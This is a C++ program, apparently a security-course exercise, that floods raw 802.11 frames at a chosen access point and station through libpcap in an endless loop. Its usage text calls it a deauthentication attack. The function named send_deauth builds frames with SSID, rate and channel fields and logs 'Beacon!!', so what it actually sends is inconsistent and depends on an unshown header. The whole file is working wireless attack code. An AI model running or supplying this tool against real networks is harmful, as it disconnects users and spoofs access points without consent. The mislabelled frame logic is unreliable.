#include <stdio.h>
#include <pcap.h>
#include <unistd.h>
#include <stdint.h>
#include <iostream>
#include<string>
#include "header.h"
using namespace std;
void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack wlan1 70:5D:CC:04:2B:A2 66:77:88:99:AA:BB\n");
}
void send_deauth(pcap_t* handle, Mac ap, Mac st){
    char ssid[40]="helloworld";
    u_char supported_data_rates[8]={0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
    u_char currentch[1]={0x0c};
    static int count=1;
    int totallen=sizeof(radiotap_header)+sizeof(ieeeheader)+6+strlen(ssid)+sizeof(supported_data_rates)/sizeof(u_char)+sizeof(currentch)/sizeof(u_char);
    frame packet=frame(ap,st);
    Taggedparameter ssidparameter=Taggedparameter(0,strlen(ssid),(u_char*)ssid);
    Taggedparameter supportedrates=Taggedparameter(1,sizeof(supported_data_rates)/sizeof(u_char),supported_data_rates);
    Taggedparameter dsparameter=Taggedparameter(3,sizeof(currentch)/sizeof(u_char),currentch);
    memcpy(packet.tagged_parameter_area,&ssidparameter,2+strlen(ssid));
    memcpy(packet.tagged_parameter_area+2+strlen(ssid),&supportedrates,2+sizeof(supported_data_rates)/sizeof(u_char));
    memcpy(packet.tagged_parameter_area+4+strlen(ssid)+sizeof(supported_data_rates)/sizeof(u_char),
    &dsparameter,2+sizeof(currentch)/sizeof(u_char));
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), totallen); 
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    cout<<"[INFO] Beacon!! from "<<string(ap)<<" to "<<string(st)<<" ["<<count++<<"]"<<endl;
}
int main(int argc, char* argv[]) {
    Mac ap;
    Mac st;
    if (argc < 3) {
        usage();
        return -1;
    }
    if(argc==3){
        ap=Mac(string(argv[2]));
        st=Mac("ff:ff:ff:ff:ff:ff");
    }
    else{
        ap=Mac(string(argv[2]));
        st=Mac(string(argv[3]));
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }

    while (true) {
        send_deauth(handle, ap,st);
        usleep(100000);
    }
    pcap_close(handle);
}
